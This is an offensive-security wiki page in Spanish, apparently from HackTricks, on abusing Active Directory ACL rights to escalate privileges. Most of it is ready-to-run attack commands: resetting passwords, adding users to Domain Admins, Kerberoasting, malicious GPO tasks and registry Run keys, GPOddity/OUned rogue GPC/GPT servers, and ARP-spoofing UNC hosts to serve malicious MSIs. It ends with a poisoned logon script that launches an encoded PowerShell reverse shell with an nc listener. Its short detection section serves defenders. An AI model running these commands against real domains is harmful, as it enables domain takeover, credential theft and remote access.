# Abuso de ACL/ACE de Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Esta página es principalmente un resumen de las técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **y** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para más detalles, consulta los artículos originales.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Derechos GenericAll sobre un usuario**

Este privilegio otorga al atacante control total sobre la cuenta de usuario objetivo. Una vez confirmados los derechos `GenericAll` mediante el comando `Get-ObjectAcl`, el atacante puede:

- **Cambiar la contraseña del objetivo**: Con `net user <username> <password> /domain`, el atacante puede restablecer la contraseña del usuario.
- En Linux, se puede hacer lo mismo mediante SAMR con Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Si la cuenta está deshabilitada, elimina el indicador UAC**: `GenericAll` permite editar `userAccountControl`. Desde Linux, BloodyAD puede quitar el indicador `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Asigna un SPN a la cuenta del usuario para hacerla kerberoastable; luego usa Rubeus y targetedKerberoast.py para extraer los hashes de los tickets de concesión de tickets (TGT) e intentar crackearlos.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Deshabilita la preautenticación para el usuario, haciendo que su cuenta sea vulnerable a ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Con `GenericAll` sobre un usuario, puedes añadir una credencial basada en certificado y autenticarte como ese usuario sin cambiar su contraseña. Consulta:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Derechos GenericAll sobre un grupo**

Este privilegio permite a un atacante manipular las membresías de grupos si tiene derechos `GenericAll` sobre un grupo como `Domain Admins`. Tras identificar el nombre distinguido del grupo con `Get-NetGroup`, el atacante puede:

- **Añadirse al grupo Domain Admins**: Esto se puede hacer mediante comandos directos o usando módulos como Active Directory o PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Desde Linux también puedes aprovechar BloodyAD para agregarte a grupos arbitrarios cuando tienes permisos GenericAll/Write sobre su membresía. Si el grupo objetivo está anidado en «Remote Management Users», obtendrás inmediatamente acceso WinRM a los hosts que reconozcan ese grupo:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write en equipo/usuario**

Tener estos privilegios sobre un objeto de equipo o una cuenta de usuario permite:

- **Kerberos Resource-based Constrained Delegation**: Permite tomar el control de un objeto de equipo.
- **Shadow Credentials**: Usa esta técnica para suplantar a una cuenta de equipo o usuario aprovechando los privilegios para crear shadow credentials.

## **WriteProperty en grupo**

Si un usuario tiene derechos `WriteProperty` sobre todos los objetos de un grupo específico (p. ej., `Domain Admins`), puede:

- **Añadirse al grupo Domain Admins**: Esto puede lograrse combinando los comandos `net user` y `Add-NetGroupUser` y permite escalar privilegios dentro del dominio.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) en un grupo**

Este privilegio permite a los atacantes agregarse a grupos específicos, como `Domain Admins`, mediante comandos que modifican directamente la pertenencia a grupos. La siguiente secuencia de comandos permite agregarse a sí mismos:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Auto-Pertenencia)**

Un privilegio similar que permite a los atacantes agregarse directamente a grupos modificando sus propiedades, si tienen el derecho `WriteProperty` sobre esos grupos. La comprobación y ejecución de este privilegio se realizan con:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Tener el `ExtendedRight` sobre un usuario para `User-Force-Change-Password` permite restablecer contraseñas sin conocer la contraseña actual. La verificación de este derecho y su explotación pueden realizarse mediante PowerShell u otras herramientas de línea de comandos, que ofrecen varios métodos para restablecer la contraseña de un usuario, incluidas sesiones interactivas y one-liners para entornos no interactivos. Los comandos van desde invocaciones sencillas de PowerShell hasta el uso de `rpcclient` en Linux, lo que demuestra la versatilidad de los vectores de ataque.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner en un grupo**

Si un atacante descubre que tiene permisos `WriteOwner` sobre un grupo, puede cambiar la propiedad del grupo para que sea suya. Esto tiene un impacto especialmente importante cuando el grupo en cuestión es `Domain Admins`, ya que cambiar la propiedad permite tener un mayor control sobre los atributos y la membresía del grupo. El proceso consiste en identificar el objeto correcto mediante `Get-ObjectAcl` y luego usar `Set-DomainObjectOwner` para modificar el propietario, ya sea mediante SID o nombre.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite en User**

Este permiso permite a un atacante modificar las propiedades de un usuario. En concreto, con acceso `GenericWrite`, el atacante puede cambiar la ruta del script de inicio de sesión de un usuario para ejecutar un script malicioso cuando este inicie sesión. Esto se consigue usando el comando `Set-ADObject` para actualizar la propiedad `scriptpath` del usuario objetivo y hacer que apunte al script del atacante.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Un ACE `WriteProperty` más específico, limitado al atributo [`scriptPath` del usuario](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), puede ser suficiente; no se requiere `GenericWrite`. Combina ese derecho sobre el atributo con un script modificable en el árbol `SYSVOL\<domain>\scripts` o `NETLOGON` del dominio y luego evalúa si es probable que el usuario objetivo inicie sesión y acceda al script. El script se ejecuta en el contexto de ese usuario al iniciar sesión. Revisa por separado las ACL efectivas de AD y las ACL de archivos/recursos compartidos; una ACE Allow coincidente o un directorio modificable por sí solos no demuestran que la ruta completa esté disponible.

## **GenericWrite en un grupo**

Con este privilegio, los atacantes pueden manipular la pertenencia a grupos, por ejemplo, agregándose a sí mismos o a otros usuarios a grupos específicos. El proceso consiste en crear un objeto de credenciales, usarlo para agregar o quitar usuarios de un grupo y verificar los cambios en la pertenencia mediante comandos de PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Desde Linux, Samba `net` puede agregar o quitar miembros cuando tienes `GenericWrite` sobre el grupo (útil cuando PowerShell/RSAT no están disponibles):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Ser propietario de un objeto de AD y tener privilegios `WriteDACL` sobre él permite a un atacante concederse privilegios `GenericAll` sobre el objeto. Esto se consigue mediante la manipulación de ADSI, lo que permite controlar completamente el objeto y modificar sus pertenencias a grupos. Aun así, existen limitaciones al intentar explotar estos privilegios con los cmdlets `Set-Acl` / `Get-Acl` del módulo Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Apropiación rápida con WriteDACL/WriteOwner (PowerView)

Cuando tienes `WriteOwner` y `WriteDacl` sobre un usuario o una cuenta de servicio, puedes tomar el control total y restablecer su contraseña usando PowerView sin conocer la contraseña anterior:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notas:
- Es posible que primero tengas que cambiar el propietario a tu nombre si solo tienes `WriteOwner`:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Validar el acceso con cualquier protocolo (SMB/LDAP/RDP/WinRM) después de restablecer la contraseña.

## **Replicación en el dominio (DCSync)**

El ataque DCSync aprovecha permisos de replicación específicos en el dominio para hacerse pasar por un Domain Controller y sincronizar datos, incluidas las credenciales de usuario. Esta potente técnica requiere permisos como `DS-Replication-Get-Changes`, que permiten a los atacantes extraer información confidencial del entorno de AD sin acceso directo a un Domain Controller.<sup>[[5]](#references)</sup> [**Obtén más información sobre el ataque DCSync aquí.**](../dcsync.md)

## Delegación de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegación de GPO

El acceso delegado para administrar Group Policy Objects (GPOs) puede presentar riesgos de seguridad significativos. Por ejemplo, si a un usuario como `offense\spotless` se le delegan derechos de administración de GPO, podría tener privilegios como **WriteProperty**, **WriteDacl** y **WriteOwner**. Estos permisos pueden aprovecharse con fines maliciosos, tal como se identificó mediante PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerar permisos de GPO

Para identificar GPOs mal configurados, se pueden encadenar los cmdlets de PowerSploit. Esto permite descubrir los GPOs que un usuario específico tiene permiso para administrar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Equipos a los que se aplica una política determinada**: Es posible determinar a qué equipos se aplica un GPO específico, lo que ayuda a comprender el alcance del posible impacto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Políticas aplicadas a un equipo determinado**: Para ver qué políticas se aplican a un equipo en particular, se pueden usar comandos como `Get-DomainGPO`.

**OUs a las que se aplica una política determinada**: Se pueden identificar las unidades organizativas (OUs) afectadas por una política determinada mediante `Get-DomainOU`.

También puedes usar la herramienta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs y encontrar problemas en ellos.

### Abusar de GPO - New-GPOImmediateTask

Se pueden explotar GPOs mal configurados para ejecutar código, por ejemplo, creando una tarea programada inmediata. Esto puede hacerse para agregar un usuario al grupo de administradores locales en los equipos afectados, elevando significativamente los privilegios:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

El módulo GroupPolicy, si está instalado, permite crear y vincular nuevos GPO, y configurar preferencias como valores del registro para ejecutar backdoors en los equipos afectados. Este método requiere que se actualice el GPO y que un usuario inicie sesión en el equipo para que se ejecute:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Abusar de GPO

SharpGPOAbuse ofrece un método para abusar de GPO existentes mediante la incorporación de tareas o la modificación de configuraciones, sin necesidad de crear nuevas GPO. Esta herramienta requiere modificar GPO existentes o usar herramientas RSAT para crear otras nuevas antes de aplicar los cambios:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Forzar la actualización de directivas

Las actualizaciones de GPO suelen producirse aproximadamente cada 90 minutos. Para acelerar este proceso, especialmente después de implementar un cambio, se puede usar el comando `gpupdate /force` en el equipo de destino para forzar una actualización inmediata de las directivas. Este comando garantiza que cualquier modificación de las GPO se aplique sin esperar al siguiente ciclo de actualización automático.

### Bajo el capó

Al inspeccionar las tareas programadas de una GPO determinada, como `Misconfigured Policy`, se puede confirmar que se han añadido tareas como `evilTask`. Estas tareas se crean mediante scripts o herramientas de línea de comandos destinadas a modificar el comportamiento del sistema o escalar privilegios.

La estructura de la tarea, tal como se muestra en el archivo de configuración XML generado por `New-GPOImmediateTask`, especifica los detalles de la tarea programada, incluidos el comando que se ejecutará y sus desencadenadores. Este archivo muestra cómo se definen y administran las tareas programadas dentro de las GPO y proporciona un método para ejecutar comandos o scripts arbitrarios como parte de la aplicación de directivas.

### Usuarios y grupos

Las GPO también permiten manipular las pertenencias a usuarios y grupos en los sistemas de destino. Al editar directamente los archivos de directiva de Usuarios y grupos, los atacantes pueden agregar usuarios a grupos con privilegios, como el grupo local `administrators`. Esto es posible mediante la delegación de permisos de administración de GPO, que permite modificar los archivos de directiva para incluir nuevos usuarios o cambiar las pertenencias a grupos.

El archivo de configuración XML de Usuarios y grupos describe cómo se implementan estos cambios. Al agregar entradas a este archivo, se pueden otorgar privilegios elevados a usuarios específicos en los sistemas afectados. Este método ofrece una vía directa para escalar privilegios mediante la manipulación de GPO.

Para configuraciones de seguridad, como la pertenencia a grupos locales y los derechos de usuario, inspecciona también la plantilla de GPO aplicada en `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` y la ACL del directorio `SecEdit`. Que un directorio o archivo permita escritura es una pista que conviene revisar: el acceso efectivo al recurso compartido SYSVOL, las ACE de denegación y heredadas, los permisos del contenedor de directiva de grupo, el ámbito de la directiva y la actualización del cliente determinan si un cambio puede surtir efecto. La pertenencia a un grupo llamado “GPO Managers” por sí sola no otorga derechos de edición. [Microsoft documenta esta ruta de plantilla y la separación entre el contenedor de directiva de grupo y la plantilla.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Además, también se pueden considerar otros métodos para ejecutar código o mantener la persistencia, como aprovechar scripts de inicio o cierre de sesión, modificar claves del registro para configurar ejecuciones automáticas, instalar software mediante archivos .msi o editar configuraciones de servicios. Estas técnicas ofrecen varias vías para mantener el acceso y controlar los sistemas de destino mediante el abuso de GPO.

### Redirigir la recuperación de GPC/GPT a servicios maliciosos autenticados

Una GPO consta de un **Contenedor de directiva de grupo (GPC)** de LDAP, que contiene metadatos, y una **Plantilla de directiva de grupo (GPT)** alojada en SMB, que contiene los archivos de directiva. Durante la actualización, el cliente sigue el `gPLink` del contenedor, lee el GPC al que hace referencia y su `gPCFileSysPath`, y luego descarga la GPT desde esa ruta UNC. Por consiguiente, el acceso de escritura al propio GPC o al `gPLink` de una OU, Site o Domain puede convertirse en un mecanismo para procesar directivas con privilegios.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Envenenamiento de `gPCFileSysPath` con GPOddity

Si la entidad controlada puede escribir en el GPC de destino (directamente o mediante **NTLM relay to LDAP**), sustituye `gPCFileSysPath` por una ruta UNC alojada por el atacante. [GPOddity](https://github.com/synacktiv/GPOddity) automatiza el cambio LDAP y sirve una GPT maliciosa que contiene archivos de directiva basados en módulos o una tarea Immediate Task que el cliente de directiva de grupo ejecuta como `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

En los clientes Windows actuales, no basta con un recurso compartido SMB anónimo o que no requiera credenciales: SMB Secure Negotiate exige pruebas de que la autenticación se realizó correctamente, por lo que el servicio malicioso debe validar la identidad del dominio, derivar la clave de sesión SMB y firmar correctamente sus respuestas. En el modo integrado, configura GPOddity con una cuenta de máquina controlada y su clave de servicio; luego selecciona una carga útil del lado del equipo o del usuario en la sección `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Caso límite de User GPO:** después de MS16-072, Windows sigue creando dos sesiones SMB2 en la **misma conexión TCP**: la sesión del usuario lee `GPT.INI` y, a continuación, la sesión de la cuenta de equipo lee la configuración efectiva, como `ScheduledTasks.xml`. Por tanto, un servidor malicioso debe indexar el estado de autenticación, las claves de sesión y las claves de firma por `SessionId` de SMB2, no solo por socket. El fork de Scapy integrado en GPOddity/OUned implementa esto mediante `SMBStreamSocketMultiplexing` y un `SMBServer` que admite multiplexación; de lo contrario, los servidores de una sola sesión de Impacket/Scapy reutilizan el estado de firma incorrecto y fallan con las políticas de usuario.<sup>[[15]](#references)</sup>

#### Envenenamiento de `gPLink` con OUned

Con `WriteGPLink`, `GenericWrite` o un control equivalente sobre una OU, un Site o un dominio, un atacante puede añadir un vínculo cuyo DN de GPC se sirve desde un host LDAP controlado por el atacante. Petros Koutroumpis presentó originalmente esta técnica; [OUned](https://github.com/synacktiv/OUned) automatiza la escritura LDAP y la cadena GPC/GPT maliciosa.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

La víctima primero se autentica en el servicio LDAP malicioso y recibe un GPC cuyo `gPCFileSysPath` apunta al servicio SMB malicioso; luego se autentica en SMB y aplica el GPT proporcionado. Por lo tanto, OUned necesita una cuenta con un SPN LDAP, una cuenta de equipo con un SPN HOST para SMB (la misma cuenta de equipo puede cumplir ambos requisitos) y una resolución DNS o un reenvío inverso que dirija los puertos 389 y 445 al host del operador.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

El servidor LDAP Scapy integrado de OUned valida Kerberos/SPNEGO con la clave real del servicio controlado y sirve datos GPC arbitrarios desde JSON. La clave JSON vacía representa rootDSE, los prefijos `base64:` representan valores binarios y el servidor admite operaciones de add/delete/modify/search y búsquedas `BASE`, `LEVEL` y `SUBTREE`; puede negociar sin protección, con integridad o con confidencialidad. Esto hace que el servicio sea reutilizable cuando otro componente de Windows sigue una referencia LDAP controlada por un atacante, pero exige LDAP autenticado.<sup>[[15]](#references)</sup>

No des por sentado que sincronizar la contraseña de una cuenta con un dominio dummy reproduce todas las claves Kerberos: RC4 se deriva de la contraseña, mientras que AES string-to-key también usa un salt derivado del hostname/dominio del principal. Proporcionar la clave AES real de la cuenta a `KerberosSSP` evita forzar RC4 mediante un cambio detectable en `msDS-SupportedEncryptionTypes`, que la cuenta de máquina puede modificar por sí misma.<sup>[[15]](#references)</sup>

#### Puntos de detección

Correlaciona los cambios en `gPCFileSysPath` o `gPLink` con los cambios de versión de GPO y los nuevos XML de Immediate/Scheduled Task. Investiga los vínculos a contextos de nomenclatura inesperados, los hosts UNC fuera del conjunto aprobado de DC/SYSVOL, los registros DNS que redirigen nombres de cuentas de máquina, los tickets de servicio LDAP/CIFS para cuentas de máquina inusuales y los cambios en `msDS-SupportedEncryptionTypes` que habilitan RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` sobre una OU/dominio te permite modificar el atributo `gPLink` del contenedor de destino y **forzar la aplicación de una GPO existente** sin editar la propia GPO. Esto resulta interesante cuando la GPO vinculada ya hace referencia a contenido remoto mediante **rutas UNC** (`\\HOST\share\...`), porque los usuarios autenticados pueden leer **SYSVOL** y buscar políticas reutilizables sin conexión.<sup>[[11]](#references)</sup>

Flujo de trabajo de alto nivel:

1. Usa BloodHound para identificar un principal con `WriteGPLink` sobre una OU y enumerar los equipos/usuarios de esa OU.
2. Clona `SYSVOL` en modo de solo lectura y analiza las GPO en busca de **Software Installation**, **asignaciones de unidades** (`Drives.xml`) y **scripts de inicio de sesión/inicio** que hagan referencia a rutas UNC.
3. Da preferencia a las políticas que apunten a un **hostname directo** (por ejemplo, `\\DC02\share\pkg.msi`) en lugar de rutas DFS/espacio de nombres de dominio, porque las rutas basadas en hostname son más fáciles de redirigir mediante spoofing L2.
4. Añade el GUID de la GPO elegida al `gPLink` de la OU de destino para que la víctima procese esa política ya existente.
5. En el mismo dominio de broadcast, haz ARP spoofing del host UNC y vincula su IP localmente (`ip addr add <target_ip>/32 dev <iface>`) para que el tráfico SMB de la víctima llegue a tu host.
6. Sirve la ruta/nombre de archivo esperado desde un servidor SMB del atacante (por ejemplo, `smbserver.py`) y espera a que se procese la política con normalidad.

Ejemplo de recopilación de `SYSVOL` y correlación de GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Vincula el GPO existente a la OU objetivo:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Secuestro de UNC de Software Installation -> SYSTEM

Si la GPO vinculada implementa un MSI desde una ruta UNC, el cliente lo obtendrá durante el **inicio del equipo** y lo instalará como **`NT AUTHORITY\SYSTEM`**. Al suplantar el host referenciado y servir un MSI malicioso con la **misma ruta/nombre de recurso compartido**, puedes convertir `WriteGPLink` en ejecución de código como SYSTEM **sin modificar SYSVOL**.

Restricciones importantes:

- **El momento importa**: el nuevo vínculo se detecta al actualizar la directiva (normalmente cada ~90 minutos), pero **Software Installation** suele activarse al **reiniciar**.
- Windows Installer suele rastrear la implementación mediante el **`ProductCode`** del paquete. Si el producto ya está instalado, puede que se omita la implementación.
- Para evitar que el instalador lo rechace, modifica el MSI malicioso para que sus **`ProductCode`** y **`PackageCode`** coincidan con los del paquete legítimo que espera la GPO.
- Es posible que queden archivos de anuncio `.aas` antiguos en `SYSVOL`, así que valida que la implementación siga pareciendo activa antes de depender de ella.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Secuestro de UNC en asignaciones de unidades -> captura de NTLM / relay de WebDAV

Las asignaciones de unidades de GPP en `Drives.xml` hacen que los usuarios se autentiquen en la ruta UNC configurada durante el inicio de sesión o la reconexión. Si suplantas el host referenciado, puedes capturar **NetNTLMv2**. Si haces que SMB falle deliberadamente, Windows puede volver a intentarlo mediante **WebDAV**, enviando **NTLM por HTTP**, lo que ofrece mucha más flexibilidad para realizar relays a **LDAP(S)**, **AD CS** o **SMB**.

#### Secuestro de UNC en scripts de inicio de sesión/inicio del sistema

El mismo patrón se aplica a los scripts alojados en UNC que se encuentren en `SYSVOL`:

- Los **scripts de inicio de sesión** suelen ejecutarse en el contexto del **usuario**.
- Los **scripts de inicio del sistema** suelen ejecutarse en el contexto del **equipo / SYSTEM**.

Si la ruta del script apunta a un nombre de host suplantable, redirige el host UNC y sirve contenido de reemplazo para el script desde la ubicación esperada.

## Envenenamiento de scripts de inicio de sesión en SYSVOL/NETLOGON

Las rutas con permisos de escritura en `\\<dc>\SYSVOL\<domain>\scripts\` o `\\<dc>\NETLOGON\` permiten manipular los scripts de inicio de sesión que se ejecutan cuando los usuarios inician sesión mediante GPO. Esto permite ejecutar código en el contexto de seguridad de los usuarios que inician sesión.

### Localizar scripts de inicio de sesión
- Inspecciona los atributos de usuario para encontrar un script de inicio de sesión configurado:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Rastrear los recursos compartidos del dominio para detectar accesos directos o referencias a scripts:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Analiza archivos `.lnk` para resolver destinos que apunten a SYSVOL/NETLOGON (truco útil de DFIR y para atacantes sin acceso directo a GPO):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound muestra el atributo de script de inicio de sesión `scriptPath` del objeto de usuario, si está presente. Los scripts de inicio de sesión configurados mediante GPO son una referencia de directiva independiente, así que inspecciona también la GPO aplicable.

### Validar el acceso de escritura (no confíes en los listados de recursos compartidos)
Las herramientas automatizadas pueden mostrar SYSVOL/NETLOGON como de solo lectura aunque el ACL NTFS del script específico sea diferente. Empieza inspeccionando en modo de solo lectura ese archivo y su directorio principal; las ACE Allow correspondientes siguen siendo candidatas, ya que el acceso efectivo por SMB y NTFS, las ACE Deny y el token actual son factores relevantes:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Una prueba de escritura autorizada debe ser específica para el objetivo y reversible, con una copia de seguridad del script original que luego se restaure. No sobrescribas un script de inicio de sesión funcional solo para probar el acceso; una escritura exitosa puede ejecutarse cuando el siguiente usuario inicie sesión.

### Envenenar un script de inicio de sesión VBScript para RCE
Añade un comando que inicie un reverse shell de PowerShell (generado en revshells.com) y conserva la lógica original para no interrumpir las funciones empresariales:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Escucha en tu host y espera al siguiente inicio de sesión interactivo:

```bash
rlwrap -cAr nc -lnvp 443
```

Notas:
- La ejecución se realiza con el token del usuario que inicia sesión (no SYSTEM). El alcance es el vínculo de GPO (OU, sitio o dominio) que aplica ese script.
- Después de usarlo, restaura el contenido y las marcas de tiempo originales.


## References

- [1] [Abuso de ACLs/ACEs de Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Cuentas privilegiadas y privilegios de token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Actualización de la ruta de ataque ACL](https://wald0.com/?p=112)
- [4] [Enum ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Escalada de privilegios con ACLs en Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Búsqueda de privilegios y cuentas privilegiadas de Active Directory](https://adsecurity.org/?p=3658)
- [7] [Constructor de ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – operaciones de atributos/UAC de AD desde Linux](https://github.com/CravateRouge/bloodyAD)
